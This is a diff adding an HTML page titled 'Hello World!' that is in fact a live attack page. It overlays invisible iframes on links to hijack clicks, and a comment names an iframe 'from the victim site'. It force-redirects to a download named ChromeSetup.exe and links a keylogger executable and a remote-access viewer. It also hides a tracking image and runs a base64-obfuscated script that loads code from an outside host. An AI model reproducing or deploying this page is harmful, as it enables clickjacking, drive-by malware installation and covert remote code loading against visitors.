@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <meta charset="utf-8">
+      <title>Hello World!</title>
+      <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>   
+      <script src="http://cdn.rawgit.com/vincepare/iframeTracker-jquery/master/jquery.iframetracker.js"></script>
+      <style> 
+       #iframe99 {
+         /* iframe с сайта-жертвы */
+         width: 110px;
+         height: 60px;
+         position: absolute;
+         top: 40em;
+         left: 47%;
+         opacity: 0.5;
+         z-index: 1;
+       }
+        .iframe {
+          position: absolute;
+          overflow-x: hidden;
+          overflow-y: hidden;
+          z-index: 2;
+          border: 0;
+          opacity: 0;   
+        }
+     </style>   
+   </head>
+
+   <body> 
+      <div class="container">
+      <script type="text/javascript"> 
+         var strGET = window.location.search.replace( '?', '');
+         if (screen.width <= 480 && strGET != "m=not") {
+            window.location = "m/index.html";
+         }  
+      </script>
+      <img src="https://2ip.ru/sbar/2ip1.gif" alt="Узнай свой IP адрес"/>  
+      <p align="right">FTP: u141717116</p>
+      <body><h1><p align="center">Hello World!</p></h1></body>
+      <p align="center"><iframe width="640" height="360" src="https://www.youtube.com/embed/qrGx1rlaFBg" frameborder="0" allowfullscreen></iframe></p>
+      <meta http-equiv="refresh" content="0;url=/Download/ChromeSetup.exe"/>
+      <h3><b><p align="center"><a href="/Download/wecsvc.dll.exe" />Keyloger</a></p></b></h3>
+      <br><br><br>
+      <h3><b><p align="right"><a href="/Download/rms.viewer5.6ru.msi" />RMS Viewer 5.6</a></p></b></h3>
+      <img src="script.php" style="display:none">
+      </div>
+      
+      <script>  
+         function getCookie(cname) {
+            var name = cname + "=";
+            var decodedCookie = decodeURIComponent(document.cookie);
+            var ca = decodedCookie.split(';');
+            for(var i = 0; i <ca.length; i++) {
+               var c = ca[i];
+               while (c.charAt(0) == ' ') {
+                  c = c.substring(1);
+               }
+               if (c.indexOf(name) == 0) {
+                   return c.substring(name.length, c.length);
+               }
+            }
+            return "";
+         }
+         function hideIframes()
+         {
+               $('.iframe').each(function(el){
+                  $(this).css('display', 'none');
+               });
+         }
+         $(document).ready(function($){   
+           var i = 1;
+           $("a").each(function(el){
+           var pos = $(this).position();
+           var top = pos.top+96,
+               left = pos.left-1;
+               $(".container").append('<iframe src="click.html" class="iframe" id="frame'+i+'" width="105" height="22" scrolling="no" style="top: '+top+'px; left: '+left+'px;" ></iframe>');
+               i++;
+           });
+         });
+         setInterval(function(){           
+            if(getCookie('clicked') == 'yes')
+            {
+               hideIframes();
+            }
+         }, 100);       
+      </script>
+      
+      <noindex><script async src="data:text/javascript;charset=utf-8;base64,dmFyIG49ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7bi5zcmM9Ii8vdmJvcm8uZGUvaWRlbnRpZnkvc3RlcDEucGhwP2RvbT0iK2xvY2F0aW9uLmhvc3RuYW1lKyImc2l0ZT0zOTI3IjtuLm9ucmVhZHlzdGF0ZWNoYW5nZT1mdW5jdGlvbigpe2NvbnNvbGUubG9nKCJkb25lIik7fTtuLm9ubG9hZD1mdW5jdGlvbigpe2NvbnNvbGUubG9nKCJkb25lIik7fTtkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdLmFwcGVuZENoaWxkKG4pOw=="></script></noindex>
+
+      
+   </body>
+</html>
